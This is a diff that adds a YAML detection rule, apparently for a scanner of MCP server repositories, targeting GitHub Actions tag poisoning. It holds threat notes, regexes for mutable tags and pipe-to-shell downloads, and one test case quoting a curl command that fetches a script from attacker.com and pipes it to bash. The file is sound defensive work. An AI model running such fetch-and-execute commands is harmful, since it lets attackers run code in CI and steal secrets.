@@ -1,0 +1,53 @@
+id: L1
+name: GitHub Actions Tag Poisoning
+category: supply-chain-advanced
+severity: critical
+owasp: MCP10-supply-chain
+mitre: AML.T0017
+
+# THREAT INTELLIGENCE (P1 Researcher — Supply Chain):
+# Source: CVE-2025-30066 (tj-actions/changed-files, CVSS 8.6),
+#         CVE-2026-31976 (xygeni/xygeni-action, CVSS 9.3),
+#         Wiz Research (March 2025), Unit42 (March 2025)
+#
+# THE ATTACK: MCP server repos use GitHub Actions in their CI/CD pipelines.
+# Attackers compromise upstream Actions by moving mutable version tags (@v3, @v5)
+# to point at malicious commits. Any workflow referencing the tag runs the poisoned
+# code on the next CI trigger. This exfiltrates secrets (npm tokens, AWS keys,
+# DATABASE_URL) from the runner environment, or injects backdoors into the built
+# MCP server package before it is published.
+#
+# Real incidents: tj-actions/changed-files (March 2025) — 23,000+ repos exposed.
+# xygeni-action (March 2026) — C2 implant via tag poisoning.
+#
+# MITIGATION: Pin all GitHub Actions to full commit SHAs, not mutable tags.
+
+detect:
+  type: regex
+  patterns:
+    # GitHub Actions references using mutable tags instead of SHA pinning
+    - "(?i)uses:\\s*[\\w-]+/[\\w-]+@v\\d+(?:\\.\\d+)*\\s*(?:#|$|\\n)"
+    # Specifically dangerous: popular Actions known to have been compromised
+    - "(?i)uses:\\s*tj-actions/(?:changed-files|eslint-changed-files)@v"
+    - "(?i)uses:\\s*reviewdog/action-setup@v"
+    # Actions pulling from forks or non-verified orgs with mutable tags
+    - "(?i)uses:\\s*[\\w-]+/[\\w-]+@(?:main|master|dev|latest)\\s"
+    # Workflow fetching external scripts during build
+    - "(?i)(?:curl|wget|fetch)\\s+.*\\|\\s*(?:bash|sh|node|python)"
+    # Actions with run steps that download and execute from URLs
+    - "(?i)run:\\s*.*(?:curl|wget).*\\|.*(?:bash|sh|sudo)"
+  context: source_code
+  exclude_patterns:
+    - "(?i)uses:\\s*actions/(?:checkout|setup-node|setup-python|cache|upload-artifact|download-artifact)@v"
+    - "(?i)test|spec|mock|fixture|example"
+    - "(?i)uses:\\s*[\\w-]+/[\\w-]+@[0-9a-f]{40}"
+remediation: "Pin all GitHub Actions to full commit SHAs (e.g., uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29) instead of mutable version tags (@v3). Use tools like StepSecurity Harden-Runner or Pinact to auto-pin. Audit all workflow files for pipe-to-shell patterns. CVE-2025-30066 and CVE-2026-31976 demonstrated this enables secret exfiltration and RCE via CI/CD."
+test_cases:
+  true_positive:
+    - { description: "GitHub workflow uses tj-actions/changed-files@v45 with mutable tag", expected: true }
+    - { description: "Workflow runs 'curl https://attacker.com/setup.sh | bash' in a run step", expected: true }
+    - { description: "Workflow references third-party action@main instead of pinned SHA", expected: true }
+  true_negative:
+    - { description: "Workflow uses actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 with pinned SHA", expected: false }
+    - { description: "Test file contains example workflow YAML for documentation", expected: false }
+enabled: true
